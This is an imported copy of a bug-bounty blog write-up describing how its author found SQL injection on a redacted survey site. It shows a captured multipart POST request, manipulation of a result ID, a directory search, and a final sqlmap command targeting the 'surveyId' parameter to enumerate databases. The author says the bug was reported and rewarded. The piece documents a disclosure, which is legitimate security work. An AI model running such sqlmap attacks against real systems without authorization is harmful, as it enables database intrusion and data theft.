---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-12-07_a032021-injection-sql-injection-through-internal-directory-disclose.md
original_filename: 2022-12-07_a032021-injection-sql-injection-through-internal-directory-disclose.md
title: A03:2021 — [Injection] SQL Injection through internal directory disclose
category: documents
detected_topics:
- sqli
- command-injection
- cors
- information-disclosure
- api-security
tags:
- imported
- documents
- sqli
- command-injection
- cors
- information-disclosure
- api-security
language: en
raw_sha256: 562ab53aa803c9968fa382eacb65bcafa22b214084bacbd6f6c9278a7c148895
text_sha256: 3a3bf1901af42635b42192cd6405597666a49dd89e611009b1ccbb3d858f933b
ingested_at: '2026-06-28T07:32:16Z'
sensitivity: unknown
redactions_applied: false
---

# A03:2021 — [Injection] SQL Injection through internal directory disclose

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-12-07_a032021-injection-sql-injection-through-internal-directory-disclose.md
- Source Type: markdown
- Detected Topics: sqli, command-injection, cors, information-disclosure, api-security
- Ingested At: 2026-06-28T07:32:16Z
- Redactions Applied: False
- Raw SHA256: `562ab53aa803c9968fa382eacb65bcafa22b214084bacbd6f6c9278a7c148895`
- Text SHA256: `3a3bf1901af42635b42192cd6405597666a49dd89e611009b1ccbb3d858f933b`


## Content

---
title: "A03:2021 — [Injection] SQL Injection through internal directory disclose"
url: "https://tusharvaidya16.medium.com/a03-2021-injection-sql-injection-through-internal-directory-disclose-ecdef5230131"
authors: ["Tushar"]
bugs: ["SQL injection", "Information disclosure"]
publication_date: "2022-12-07"
added_date: "2022-12-09"
source: "pentester.land/writeups.json"
original_index: 1806
scraped_via: "browseros"
---

# A03:2021 — [Injection] SQL Injection through internal directory disclose

1

A03:2021 — [Injection] SQL Injection through internal directory disclose
Tushar
Follow
5 min read
·
Dec 7, 2022

30

1

WHOAMI

My name is Tushar Vaidya, a cybersecurity enthusiast and pentester. Handles — Linkedin, Website

OBJECTIVE

Everyone knows what is SQL Injection, here I found the sqli in one of the sites by changing the directory. Plus, I found a misconfiguration in the directory which expose the internal web directory location. Remember you always need to keep looking for responses because we always found interesting parameters from responses. Let’s get started.

Technical Review

Let’s call our target as redacted.com. I submitted one survey result after that it was redirected to another URL and that URL ended with some unique number. I tried to manipulate that URL and I got a misconfiguration error then I again go back to that survey form and play around there. I look closely at that I found a parameter that reflected in response with the same number which I got in redirected URL. So, I decided to play there but before jumping on that I always like to play the email parameter because that parameter is always jucy if you are from a truly pentester side field you know what I meant.😉 After submitting the form I again rescan the target with a directory search and found a new URL. That was our key finding and I learned new things on that days, again.😅 This is our scenario now jump on to the exploit part.

First, I’ve captured the HTTP request while visiting:

https://assessment.redacted.com/welcome/survey_result

Here I added two email IDs in the email field to identify something new moreover I found new stuff in the updated redirected URL.

Get Tushar’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Below is the full request.

POST /welcome/survey_result HTTP/1.1
Host: assessment.redacted.com
Cookie: _ga=BOOM; _gid=BOOM; _ga=BOOM; _gid=BOOM; ln_or=d; ci_session=BOOM
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary= — — — — — — — — — — — — — -5213360898382474
Content-Length: 1588
Origin: https://assessment.redacted.com
Referer: https://assessment.redacted.com/people-excellence/assessment
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close
— — — — — — — — — — — — — — -52133608983824741126631511
Content-Disposition: form-data; name=”surveyId”
46
— — — — — — — — — — — — — — -52133608983824741126631511
Content-Disposition: form-data; name=”bcpTest1"
0.5
— — — — — — — — — — — — — -52133608983824741126631511
Content-Disposition: form-data; name=”bcpTest2"
0
— — — — — — — — — — — — — — -52133608983824741126631511
Content-Disposition: form-data; name=”bcpTest3"
1
— — — — — — — — — — — — — — -52133608983824741126631511
Content-Disposition: form-data; name=”bcpTest4"
0
— — — — — — — — — — — — — — -52133608983824741126631511
Content-Disposition: form-data; name=”bcpTest5"
0.5
— — — — — — — — — — — — — — -52133608983824741126631511
Content-Disposition: form-data; name=”bcpTest6"
1
— — — — — — — — — — — — — — -52133608983824741126631511
Content-Disposition: form-data; name=”bcpTest7"
0
— — — — — — — — — — — — — — -52133608983824741126631511
Content-Disposition: form-data; name=”bcpTest8"
1
— — — — — — — — — — — — — — -52133608983824741126631511
Content-Disposition: form-data; name=”bcpTest9"
0.5
— — — — — — — — — — — — — — -52133608983824741126631511
Content-Disposition: form-data; name=”company-name”
Ba2man
— — — — — — — — — — — — — — -52133608983824741126631511
Content-Disposition: form-data; name=”username”
Ba1man
— — — — — — — — — — — — — — -52133608983824741126631511
Content-Disposition: form-data; name=”email”
ba1man+1@gmail.com&ba1man@gmail.com

— — — — — — — — — — — — — — -52133608983824741126631511 —

After submitting the above request server gave the response with the below URL:

https://assessment.redacted.com/people-excellence/result-721.php

Then after I change the 721 to 720 and got a server error!!!

Press enter or click to view image in full size

After I decided to open the below survey form link in the browser to check just GUI and again got the error.😅

https://assessment.redacted.com.com/welcome/survey_result

Press enter or click to view image in full size

After understanding the application I played with “surveyId” and again put a directory search and found a new URL which is mentioned below.

Press enter or click to view image in full size

Moreover, I was very exhausted from doing manual stuff so after knowing the vulnerable parameter I hit the SQLMAP to do the rest of the work for me😊.

If someone is new to the infosec field so this explanation for them. I save the original request in the sql_submit.txt file and then mention the specific parameter through -p so sqlmap only does testing on that parameter and saves our time. Here is my final crafted command for sqlmap:

sqlmap -r sql_submit.txt -p surveyId — level=5 — risk=3 — batch — dbs — time-sec=10

Now it is time to take very good sleep after getting good results🥂

Press enter or click to view image in full size
Boom!!!

After that, I reported this vulnerability to the programmer and I got rewards. Always help the organization to secure them because I worked as a security architecture so I knew that one small bug can exploit the whole company’s sensitive data.

Thanks for taking the time to read my write-up. I hope you got something interesting from this blog.
